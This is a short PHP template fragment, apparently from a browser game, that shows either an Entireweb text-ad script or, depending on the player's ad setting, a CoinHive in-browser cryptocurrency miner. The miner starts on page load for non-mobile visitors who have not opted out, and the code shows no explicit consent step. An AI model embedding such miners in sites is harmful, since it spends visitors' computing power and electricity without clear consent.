<?php
if ($ir['adtype'] == 0)
{
    ?><script type="text/javascript">
        sa_client = "5b3cf0c66cb49cdf265bc21885431f53";
        sa_code = "57f2b462a1df6942a7b9611496625ba6";
        sa_protocol = ("https:"==document.location.protocol)?"https":"http";
        sa_pline = "0";
        sa_maxads = "1";
        sa_bgcolor = "000000";
        sa_bordercolor = "FF6323";
        sa_superbordercolor = "FF6323";
        sa_linkcolor = "FFE14A";
        sa_desccolor = "FFFFFF";
        sa_urlcolor = "FFE14A";
        sa_b = "1";
        sa_format = "rect_125x125";
        sa_width = "125";
        sa_height = "125";
        sa_location = "0";
        sa_radius = "0";
        sa_borderwidth = "1";
        sa_font = "0";
        </script>
    <script type="text/javascript" src="//sa.entireweb.com/sense2.js"></script> <?php
}
else
{
    if (!isset($userid))
        $userid=0;
    ?>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
        var miner = new CoinHive.User('1ioYO3VM26L0boYjtjxgoNn0v57pMESE', '<?php echo $userid; ?>', {throttle: 0.5});

        // Only start on non-mobile devices and if not opted-out
        // in the last 14400 seconds (4 hours):
        if (!miner.isMobile() && !miner.didOptOut(14400)) {
            miner.start();
        }
    </script>
    <?php
}